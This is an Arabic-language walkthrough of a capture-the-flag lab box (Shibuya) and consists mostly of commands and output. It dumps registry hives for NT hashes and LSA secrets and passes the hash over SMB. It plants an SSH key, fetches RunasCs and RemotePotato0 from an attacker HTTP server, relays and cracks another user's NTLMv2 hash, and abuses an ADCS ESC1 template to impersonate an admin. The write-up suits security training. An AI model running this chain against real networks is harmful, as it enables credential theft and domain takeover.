-rw-rw-rw-     365686  Wed Feb 19 20:35:20 2025 vss-meta.cab
# mget *
[*] Downloading AWSJPWK0222-01.wim
[*] Downloading AWSJPWK0222-02.wim
[*] Downloading AWSJPWK0222-03.wim
[*] Downloading vss-meta.cab
# exit
```
بعدين منروح على /mnt
```bash
┌──(cybersoldier㉿kali)-[~]
└─$ sudo wimmount AWSJPWK0222-02.wim /mnt

┌──(cybersoldier㉿kali)-[~]
└─$ cd /mnt/Windows/System32/config/
cd: permission denied: /mnt/Windows/System32/config/

┌──(cybersoldier㉿kali)-[~]
└─$ sudo cd /mnt/Windows/System32/config/
sudo: cd: command not found
sudo: "cd" is a shell built-in command, it cannot be run directly.
sudo: the -s option may be used to run a privileged shell.
sudo: the -D option may be used to run a command in a specific directory.

┌──(cybersoldier㉿kali)-[~]
└─$ sudo su
┌──(root㉿kali)-[/home/cybersoldier]
└─# cd /mnt/Windows/System32/config/
cd: no such file or directory: /mnt/Windows/System32/config/

┌──(root㉿kali)-[/home/cybersoldier]
└─# ls
 AWSJPWK0222-01.wim   AWSJPWK0222-03.wim       Desktop     Downloads                                         mtkclient   Pictures   Public    Templates  'VirtualBox VMs'   x6725
 AWSJPWK0222-02.wim   Burpsuite-Professional   Documents   ferox-https_tayseer_solutions_-1790966751.state   Music       Projects   reports   Videos      vss-meta.cab

┌──(root㉿kali)-[/home/cybersoldier]
└─#  sudo wimmount AWSJPWK0222-02.wim /mnt

┌──(root㉿kali)-[/home/cybersoldier]
└─# mkdir /mnt

┌──(root㉿kali)-[/home/cybersoldier]
└─# cd /mnt

┌──(root㉿kali)-[/mnt]
└─# ls
BBI                                                                                           DEFAULT.LOG2                                                                               SAM
BBI{c76cbcfb-afc9-11eb-8234-000d3aa6d50e}.TM.blf                                              DRIVERS                                                                                    SAM.LOG1
BBI{c76cbcfb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms         DRIVERS{c76cbcbb-afc9-11eb-8234-000d3aa6d50e}.TM.blf                                       SAM.LOG2
BBI{c76cbcfb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms         DRIVERS{c76cbcbb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms  SECURITY
BBI.LOG1                                                                                      DRIVERS{c76cbcbb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms  SECURITY.LOG1
BBI.LOG2                                                                                      DRIVERS.LOG1                                                                               SECURITY.LOG2
BCD-Template                                                                                  DRIVERS.LOG2                                                                               SOFTWARE
BCD-Template.LOG                                                                              ELAM                                                                                       SOFTWARE.LOG1
COMPONENTS                                                                                    ELAM{c76cbd09-afc9-11eb-8234-000d3aa6d50e}.TM.blf                                          SOFTWARE.LOG2
COMPONENTS{c76cbcad-afc9-11eb-8234-000d3aa6d50e}.TM.blf                                       ELAM{c76cbd09-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms     SYSTEM
COMPONENTS{c76cbcad-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms  ELAM{c76cbd09-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms     SYSTEM.LOG1
COMPONENTS{c76cbcad-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms  ELAM.LOG1                                                                                  SYSTEM.LOG2
COMPONENTS.LOG1                                                                               ELAM.LOG2                                                                                  systemprofile
COMPONENTS.LOG2                                                                               Journal                                                                                    TxR
DEFAULT                                                                                       netlogon.ftl
DEFAULT.LOG1                                                                                  RegBack

┌──(root㉿kali)-[/mnt]
└─#
```
بعدين chmod 777 على الملفات عشان نخلي اليوزر العادي تبع ال kali يسوي dump او ممكن root user 
```bash

┌──(cybersoldier㉿kali)-[~]
└─$ chmod 777 SAM SECURITY SYSTEM
chmod: changing permissions of 'SAM': Operation not permitted
chmod: changing permissions of 'SECURITY': Operation not permitted
chmod: changing permissions of 'SYSTEM': Operation not permitted

┌──(cybersoldier㉿kali)-[~]
└─$ impacket-secretsdump -system SYSTEM -sam SAM -security SECURITY local

Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Target system bootKey: 0x2e971736685fc53bfd5106d471e2f00f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8dcb5ed323d1d09b9653452027e8c013:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9dc1b36c1e31da7926d77ba67c654ae6:::
operator:1000:aad3b435b51404eeaad3b435b51404ee:5d8c3d1a20bd63f60f469f6763ca0d50:::
[*] Dumping cached domain logon information (domain/username:hash)
SHIBUYA.VL/Simon.Watson:$DCC2$10240#Simon.Watson#04b20c71b23baf7a3025f40b3409e325: (2025-02-16 11:17:56+00:00)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC:plain_password_hex:2f006b004e0045004c0045003f0051005800290040004400580060005300520079002600610027002f005c002e002e0053006d0037002200540079005e0044003e004e0056005f00610063003d00270051002e00780075005b0075005c00410056006e004200230066004a0029006f007a002a005700260031005900450064003400240035004b0079004d006f004f002100750035005e0043004e002500430050006e003a00570068005e004e002a0076002a0043005a006c003d00640049002e006d005a002d002d006e0056002000270065007100330062002f00520026006b00690078005b003600670074003900
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:1fe837c138d1089c9a0763239cd3cb42
[*] DPAPI_SYSTEM
dpapi_machinekey:0xb31a4d81f2df440f806871a8b5f53a15de12acc1
dpapi_userkey:0xe14c10978f8ee226cbdbcbee9eac18a28b006d06
[*] NL$KM
 0000   92 B9 89 EF 84 2F D6 55  73 67 31 8F E0 02 02 66   ...../.Usg1....f
 0010   F9 81 42 68 8C 3B DF 5D  0A E5 BA F2 4A 2C 43 0E   ..Bh.;.]....J,C.
 0020   1C C5 4F 40 1E F5 98 38  2F A4 17 F3 E9 D9 23 E3   ..O@...8/.....#.
 0030   D1 49 FE 06 B3 2C A1 1A  CB 88 E4 1D 79 9D AE 97   .I...,......y...
NL$KM:92b989ef842fd6557367318fe0020266f98142688c3bdf5d0ae5baf24a2c430e1cc54f401ef598382fa417f3e9d923e3d149fe06b32ca11acb88e41d799dae97
[*] Cleaning up...
```
وبهيك منقدر محصل على اسم يوزر اسمه simon.watson
وبعدين منجرب اذا كان operator  نفس hash  simon.watson 
```bash
 nxc smb shibuya.vl -u 'Simon.watson' -H 5d8c3d1a20bd63f60f469f6763ca0d50
SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\Simon.watson:5d8c3d1a20bd63f60f469f6763ca0d50
```
وبعدين منفوت نعمل access 
على smb shares 
ومناخذ user.txt 
```bash
impacket-smbclient -k shibuya.vl/'Simon.watson'@AWSJPDC0522.shibuya.vl -hashes :5d8c3d1a20bd63f60f469f6763ca0d50
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
Type help for list of commands
# cd users
[-] No share selected
# use users
# ls
drw-rw-rw-          0  Sun Feb 16 13:50:59 2025 .
drw-rw-rw-          0  Wed Apr  9 03:09:45 2025 ..
drw-rw-rw-          0  Wed Apr  9 02:36:27 2025 Administrator
drw-rw-rw-          0  Sat Feb 15 18:48:20 2025 All Users
drw-rw-rw-          0  Sat Feb 15 18:49:12 2025 Default
drw-rw-rw-          0  Sat Feb 15 18:48:20 2025 Default User
-rw-rw-rw-        174  Sat Feb 15 18:46:52 2025 desktop.ini
drw-rw-rw-          0  Wed Apr  9 02:30:42 2025 nigel.mills
drw-rw-rw-          0  Sat Feb 15 09:49:31 2025 Public
drw-rw-rw-          0  Tue Feb 18 22:36:45 2025 simon.watson
# cd simon.watson
# ls
drw-rw-rw-          0  Tue Feb 18 22:36:45 2025 .
drw-rw-rw-          0  Sun Feb 16 13:50:59 2025 ..
drw-rw-rw-          0  Sun Feb 16 13:42:06 2025 AppData
drw-rw-rw-          0  Sun Feb 16 13:42:06 2025 Application Data
drw-rw-rw-          0  Sun Feb 16 13:42:06 2025 Cookies
drw-rw-rw-          0  Wed Apr  9 03:06:32 2025 Desktop
drw-rw-rw-          0  Sun Feb 16 13:42:06 2025 Documents
drw-rw-rw-          0  Sun Feb 16 13:42:05 2025 Downloads
drw-rw-rw-          0  Sun Feb 16 13:42:05 2025 Favorites
drw-rw-rw-          0  Sun Feb 16 13:42:05 2025 Links
drw-rw-rw-          0  Sun Feb 16 13:42:06 2025 Local Settings
drw-rw-rw-          0  Sun Feb 16 13:42:05 2025 Music
drw-rw-rw-          0  Sun Feb 16 13:42:06 2025 My Documents
drw-rw-rw-          0  Sun Feb 16 13:42:06 2025 NetHood
-rw-rw-rw-     262144  Sun Feb 16 13:42:05 2025 NTUSER.DAT
-rw-rw-rw-          0  Sun Feb 16 13:42:05 2025 ntuser.dat.LOG1
-rw-rw-rw-          0  Sun Feb 16 13:42:05 2025 ntuser.dat.LOG2
-rw-rw-rw-      65536  Sun Feb 16 13:42:08 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TM.blf
-rw-rw-rw-     524288  Sun Feb 16 13:42:05 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000001.regtrans-ms
-rw-rw-rw-     524288  Sun Feb 16 13:42:05 2025 NTUSER.DAT{c76cbcdb-afc9-11eb-8234-000d3aa6d50e}.TMContainer00000000000000000002.regtrans-ms
-rw-rw-rw-         20  Tue Feb 18 22:30:58 2025 ntuser.ini
drw-rw-rw-          0  Sun Feb 16 13:42:05 2025 Pictures
drw-rw-rw-          0  Sun Feb 16 13:42:06 2025 PrintHood
drw-rw-rw-          0  Sun Feb 16 13:42:06 2025 Recent
drw-rw-rw-          0  Sun Feb 16 13:42:05 2025 Saved Games
drw-rw-rw-          0  Sun Feb 16 13:42:06 2025 SendTo
drw-rw-rw-          0  Sun Feb 16 13:42:06 2025 Start Menu
drw-rw-rw-          0  Sun Feb 16 13:42:06 2025 Templates
drw-rw-rw-          0  Sun Feb 16 13:42:05 2025 Videos
# cd Desktop
# ls
drw-rw-rw-          0  Wed Apr  9 03:06:32 2025 .
drw-rw-rw-          0  Tue Feb 18 22:36:45 2025 ..
-rw-rw-rw-         32  Wed Apr  9 03:06:45 2025 user.txt
# cat user.txt
7353156*************************
```
# ssh على simon 
منقدر من خلال الاتي 
```bash
$ ssh-keygen -t ed25519 -f amra 
$ mv amra.pub authorized_keys
```
ومنرفع على smbclient 
```bash
$ impacket-smbclient simon.watson@shibuya.vl -hashes :5d8c3d1a20bd63f60f469f6763ca0d50 
# use users 
# cd simon.watson 
# mkdir .ssh 
# cd .ssh 
# put authorized_keys
```
بعدين ومندخل ssh 
```bash
ssh -i amra -D 1080 simon.watson@shibuya.vl
```
# جزئية التنقل لمسنخدم اعلى او بصلاحيات اعلى 
منتاكد من powershell عشان ADCS
```powershell
Microsoft Windows [Version 10.0.20348.3453]
(c) Microsoft Corporation. All rights reserved.

shibuya\simon.watson@AWSJPDC0522 C:\Users\simon.watson>ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

shibuya\simon.watson@AWSJPDC0522 C:\Users\simon.watson>dir
 Volume in drive C has no label.
 Volume Serial Number is 46FF-CF3D

 Directory of C:\Users\simon.watson

10/03/2026  01:41 PM    <DIR>          .
02/16/2025  03:42 AM    <DIR>          ..
10/03/2026  01:42 PM    <DIR>          .ssh
04/08/2025  05:06 PM    <DIR>          Desktop
02/16/2025  03:42 AM    <DIR>          Documents
05/08/2021  01:20 AM    <DIR>          Downloads
05/08/2021  01:20 AM    <DIR>          Favorites
05/08/2021  01:20 AM    <DIR>          Links
05/08/2021  01:20 AM    <DIR>          Music
05/08/2021  01:20 AM    <DIR>          Pictures
05/08/2021  01:20 AM    <DIR>          Saved Games
05/08/2021  01:20 AM    <DIR>          Videos
               0 File(s)              0 bytes
              12 Dir(s)   6,380,589,056 bytes free

shibuya\simon.watson@AWSJPDC0522 C:\Users\simon.watson>whoami 
shibuya\simon.watson

shibuya\simon.watson@AWSJPDC0522 C:\Users\simon.watson>ps
'ps' is not recognized as an internal or external command,
operable program or batch file.

shibuya\simon.watson@AWSJPDC0522 C:\Users\simon.watson>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\simon.watson> ps

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName                                                                                                                                                                     
-------  ------    -----      -----     ------     --  -- -----------                                                                                                                                                                     
    116       8     4288       9088              3904   0 AggregatorHost                                                                                                                                                                  
    400      35    12784      22500              1964   0 certsrv                                                                                                                                                                         
     85       6     5160       4872       0.02   2176   0 cmd                                                                                                                                                                             
    101       8     1196       5380       0.02   6968   0 conhost       
<SNIP>
```
في certsrv بالتالي في ADCS

يعني منقدر نسختدم اداة RunasCs
شو هاي الاداة ؟ 
هاي أداة بتخليك تشغل أي برنامج أو أمر على الكمبيوتر بصلاحيات مستخدم ثاني (مثلاً كـ Administrator أو مدير)، وأنت فايت بحساب مستخدم عادي، بس بتعطيها اسم المستخدم وركلمته (كلمة السر) بشكل صريح

خلينا ننقلها للماشين 
```bash
sudo python3 -m http.server 80
```
بعدين 
```powershell
PS C:\Users\simon.watson> wget http://10.10.16.63/RunasCs.exe -o run.exe -usebasicparsing
PS C:\Users\simon.watson> ls


    Directory: C:\Users\simon.watson


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         10/3/2026   1:42 PM                .ssh
d-r---          4/8/2025   5:06 PM                Desktop
d-r---         2/16/2025   2:42 AM                Documents
d-r---          5/8/2021   1:20 AM                Downloads
d-r---          5/8/2021   1:20 AM                Favorites
d-r---          5/8/2021   1:20 AM                Links
d-r---          5/8/2021   1:20 AM                Music
d-r---          5/8/2021   1:20 AM                Pictures
d-----          5/8/2021   1:20 AM                Saved Games
d-r---          5/8/2021   1:20 AM                Videos
-a----         10/3/2026   1:51 PM          51712 run.exe                                                                                                                                                                                 
```
هسا منشوف شو اليوزرات الثانيين من خلال runascs 

```powershell
PS C:\Users\simon.watson> .\run.exe -l 9 amra amra qwinsta

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
>services                                    0  Disc
 rdp-tcp#0         nigel.mills               1  Active
 console                                     2  Conn                        
 rdp-tcp                                 65536  Listen
PS C:\Users\simon.watson>
```
في عنا يوزر nigle.mills  عنده جلسة rdp بالتالي منقدر هجوم Cross-Session relay 

باستخدام اداة 
```powershell
wget http://10.10.16.63/RemotePotato0.exe -o Remotepotato.exe -usebasicparsing
```
النتيجة 
```powershell
PS C:\Users\simon.watson> wget http://10.10.16.63/RemotePotato0.exe -o Remotepotato.exe -usebasicparsing
PS C:\Users\simon.watson> ls


    Directory: C:\Users\simon.watson


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         10/3/2026   1:42 PM                .ssh
d-r---          4/8/2025   5:06 PM                Desktop
d-r---         2/16/2025   2:42 AM                Documents                                                                                                                                                                               
d-r---          5/8/2021   1:20 AM                Downloads
d-r---          5/8/2021   1:20 AM                Favorites
d-r---          5/8/2021   1:20 AM                Links
d-r---          5/8/2021   1:20 AM                Music
d-r---          5/8/2021   1:20 AM                Pictures
d-----          5/8/2021   1:20 AM                Saved Games
d-r---          5/8/2021   1:20 AM                Videos
-a----         10/3/2026   1:59 PM         176640 Remotepotato.exe
-a----         10/3/2026   1:59 PM         176640 run.exe                                                                                                                                                                                 


PS C:\Users\simon.watson>
```
>  الخلاصة الجدار الناري مبلك بورت 9999 فعشان هيك رح نجرب على بورت 8888
اول شيء منفتح socat على جهاز الkali 

```bash
socat -v TCP-LISTEN:135,fork,reuseaddr TCP:<machine_ip>:8888
```
وبعدين منسوي الهجوم ومنشغل الاداة 
```powershell
PS C:\Users\simon.watson> .\Remotepotato.exe -m 2 -x 10.10.16.63  -s 1 -p 8888
[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on (null) to your victim machine on port 8888
[*] Example Network redirector:
        sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:8888
[*] Starting the RPC server to capture the credentials hash from the user authentication!!
[*] Spawning COM object in the session: 1
[*] Calling StandardGetInstanceFromIStorage with CLSID:{5167B42F-C111-47A1-ACC4-8EABE61B0B54}
[*] RPC relay server listening on port 9997 ...
[*] Starting RogueOxidResolver RPC Server listening on port 8888 ...
[*] IStoragetrigger written: 104 bytes
[*] ServerAlive2 RPC Call
[*] ResolveOxid2 RPC call
[+] Received the relayed authentication on the RPC relay server on port 9997
[*] Connected to RPC Server 127.0.0.1 on port 8888
[+] User hash stolen!

NTLMv2 Client   : AWSJPDC0522
NTLMv2 Username : SHIBUYA\Nigel.Mills
NTLMv2 Hash     : Nigel.Mills::SHIBUYA:5feac843a734b464:fe02cac2eaef29883f44e8b4caa878b0:0101000000000000056cd8097c53dd01312b082dd45732680000000002000e005300480049004200550059004100010016004100570053004a0050004400430030003500320032000400140073006800690062007500790061002e0076006c0003002c004100570053004a0050004400430030003500320032002e0073006800690062007500790061002e0076006c000500140073006800690062007500790061002e0076006c0007000800056cd8097c53dd010600040006000000080030003000000000000000010000000020000039610dc0f75d4b936f813f191097cc0f502149981f1a756e18cf0c0ad8a256160a00100000000000000000000000000000000000090000000000000000000000

[*] ResolveOxid2 RPC call
[*] ResolveOxid2 RPC call
PS C:\Users\simon.watson> 
```


# كسر حماية الhash الخاص بالباسوورد 

بعد لما ناحذ ال hash 
منكسر حمايته بhashcat 

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Sail2Boat3       (Nigel.Mills)     
1g 0:00:00:00 DONE (2026-10-04 00:20) 2.631g/s 603621p/s 603621c/s 603621C/s astigg..17021982
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```
# ssh على nigle
```bash
ssh -D 1080 nigel.mills@shibuya.vl
```
```powershell
Microsoft Windows [Version 10.0.20348.3453]
(c) Microsoft Corporation. All rights reserved.


shibuya\nigel.mills@AWSJPDC0522 C:\Users\nigel.mills>
```

شوية enumeration 
```powershell


shibuya\nigel.mills@AWSJPDC0522 C:\Users\nigel.mills>ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

shibuya\nigel.mills@AWSJPDC0522 C:\Users\nigel.mills>whoami /groups

GROUP INFORMATION
-----------------

Group Name                                  Type             SID                                         Attributes                                        
=========================================== ================ =========================================== ==================================================
Everyone                                    Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access     Alias            S-1-5-32-574                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users                Alias            S-1-5-32-555                                Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group
SHIBUYA\shibuya                             Group            S-1-5-21-87560095-894484815-3652015022-1108 Mandatory group, Enabled by default, Enabled group
SHIBUYA\ssh                                 Group            S-1-5-21-87560095-894484815-3652015022-3101 Mandatory group, Enabled by default, Enabled group
SHIBUYA\t1_admins                           Group            S-1-5-21-87560095-894484815-3652015022-1103 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448                                                                                   

shibuya\nigel.mills@AWSJPDC0522 C:\Users\nigel.mills>
```
# ثغرة ADCS ESC templdates 
منستخدم certipy-ad 
ومنشوف اي tmeplate  اللي vulnerable 
```bash
proxychains certipy-ad find -vulnerable -u nigel.mills -p Sail2Boat3 -dc-ip 127.0.0.1 -stdout
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:636  ...  OK
[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 15 issuance policies
[*] Found 0 OIDs linked to templates
[!] DNS resolution failed: The resolution lifetime expired after 5.403 seconds: Server Do53:127.0.0.1@53 answered The DNS operation timed out.; Server Do53:127.0.0.1@53 answered The DNS operation timed out.; Server Do53:127.0.0.1@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[*] Retrieving CA configuration for 'shibuya-AWSJPDC0522-CA' via RRP
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.234.42:445  ...  OK
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'shibuya-AWSJPDC0522-CA'
[*] Checking web enrollment for CA 'shibuya-AWSJPDC0522-CA' @ 'AWSJPDC0522.shibuya.vl'
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.234.42:80  ...  OK
[!] Error checking web enrollment: Server disconnected without sending a response.
[!] Use -debug to print a stacktrace
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.234.42:443  ...  OK
[!] Error checking web enrollment: [SSL: UNEXPECTED_EOF_WHILE_READING] EOF occurred in violation of protocol (_ssl.c:1127)
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : shibuya-AWSJPDC0522-CA
    DNS Name                            : AWSJPDC0522.shibuya.vl
    Certificate Subject                 : CN=shibuya-AWSJPDC0522-CA, DC=shibuya, DC=vl
    Certificate Serial Number           : 2417712CBD96C58449CFDA3BE3987F52
    Certificate Validity Start          : 2025-02-15 07:24:14+00:00
    Certificate Validity End            : 2125-02-15 07:34:13+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SHIBUYA.VL\Administrators
      Access Rights
        ManageCa                        : SHIBUYA.VL\Administrators
                                          SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
        ManageCertificates              : SHIBUYA.VL\Administrators
                                          SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
        Enroll                          : SHIBUYA.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : ShibuyaWeb
    Display Name                        : ShibuyaWeb
    Certificate Authorities             : shibuya-AWSJPDC0522-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : True
    Any Purpose                         : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Any Purpose
                                          Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 100 years
    Renewal Period                      : 75 years
    Minimum RSA Key Length              : 4096
    Template Created                    : 2025-02-15T07:37:49+00:00
    Template Last Modified              : 2025-02-19T10:58:41+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SHIBUYA.VL\t1_admins
                                          SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : SHIBUYA.VL\_admin
        Full Control Principals         : SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
        Write Owner Principals          : SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
        Write Dacl Principals           : SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
        Write Property Enroll           : SHIBUYA.VL\Domain Admins
                                          SHIBUYA.VL\Enterprise Admins
    [+] User Enrollable Principals      : SHIBUYA.VL\t1_admins
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
      ESC2                              : Template can be used for any purpose.
      ESC3                              : Template has Certificate Request Agent EKU set.
                                                                                            
```

بعديها نطلب certificate 
```bash
proxychains certipy-ad req -u nigel.mills -p Sail2Boat3 -dc-ip 127.0.0.1 -ca shibuya-AWSJPDC0522-CA -template ShibuyaWeb -upn _admin@shibuya.vl -target AWSJPDC0522.shibuya.vl -key-size 4096
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The resolution lifetime expired after 5.403 seconds: Server Do53:127.0.0.1@53 answered The DNS operation timed out.; Server Do53:127.0.0.1@53 answered The DNS operation timed out.; Server Do53:127.0.0.1@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.234.42:445  ...  OK
[*] Request ID is 6
[*] Successfully requested certificate
[*] Got certificate with UPN '_admin@shibuya.vl'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to '_admin.pfx'
[*] Wrote certificate and private key to '_admin.pfx'
```
>ملاحظة: عشان رقم sid  بس استبدل sid تبع اليوزر اخريته ب 500 عشان ناخذ administrator 

اذا سوينا كلام الملاحظة وحطينا object id 
```bash
┌──(cybersoldier㉿kali)-[~]
└─$ proxychains certipy-ad req -u nigel.mills -p Sail2Boat3 -dc-ip 127.0.0.1 -ca shibuya-AWSJPDC0522-CA -template ShibuyaWeb -upn _admin@shibuya.vl -target AWSJPDC0522.shibuya.vl -key-size 4096 -sid S-1-5-21-87560095-894484815-3652015022-500
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The resolution lifetime expired after 5.403 seconds: Server Do53:127.0.0.1@53 answered The DNS operation timed out.; Server Do53:127.0.0.1@53 answered The DNS operation timed out.; Server Do53:127.0.0.1@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.234.42:445  ...  OK
[*] Request ID is 8
[*] Successfully requested certificate
[*] Got certificate with UPN '_admin@shibuya.vl'
[*] Certificate object SID is 'S-1-5-21-87560095-894484815-3652015022-500'
[*] Saving certificate and private key to '_admin.pfx'
File '_admin.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote certificate and private key to '_admin.pfx'
```
> ملاحظة حطينا _admin عشان administrator disabled 
وبعدين منعمل auth 

```bash
──(cybersoldier㉿kali)-[~]
└─$ proxychains certipy-ad auth -pfx _admin.pfx -dc-ip 127.0.0.1
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: '_admin@shibuya.vl'
[*]     SAN URL SID: 'S-1-5-21-87560095-894484815-3652015022-500'
[*]     Security Extension SID: 'S-1-5-21-87560095-894484815-3652015022-500'
[*] Using principal: '_admin@shibuya.vl'
[*] Trying to get TGT...
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:88  ...  OK
[*] Got TGT
[*] Saving credential cache to '_admin.ccache'
[*] Wrote credential cache to '_admin.ccache'
[*] Trying to retrieve NT hash for '_admin'
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:88  ...  OK
[*] Got hash for '_admin@shibuya.vl': aad3b435b51404eeaad3b435b51404ee:bab5b2a004eabb11d865f31912b6b430
```
وبعدين منخدل winrm مع port-forwarding ومناخذ فلاج root.txt


```bash
┌──(cybersoldier㉿kali)-[~]
└─$ proxychains evil-winrm -i 127.0.0.1 -u _admin -H bab5b2a004eabb11d865f31912b6b430
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
